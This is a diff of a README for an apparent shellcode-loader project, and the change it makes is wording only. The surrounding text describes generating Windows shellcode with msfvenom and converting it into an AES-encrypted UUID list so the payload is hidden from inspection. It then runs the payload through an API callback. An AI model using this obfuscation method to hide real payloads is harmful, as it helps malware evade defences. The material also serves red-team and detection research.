@@ -10,9 +10,9 @@ To execute the shellcode a pointer to it is passed as a callback funtion to [Enu
 ### Converting shellcode to Uuids
 I created the shellcode with the following command:
 `msfvenom -p windows/exec CMD=calc.exe -f raw -o calc.bin`
-then converted to an Uuids list with the bin2AESUuids.py script provided. To use it just run:
+then converted it to an Uuids list with the bin2AESUuids.py script provided. To use it just run:
 ```bash
-python3 bin2AESUuids.py calc.bin      # This script works with python 3 only, you might also need to install some libraries.
+python3 bin2AESUuids.py calc.bin      # This script works with python 3 only, you might also need to install some python libraries.
 ```
 The resulting list should be included in the code along with the decryption key, this is a nice trick to hide the payload.
 
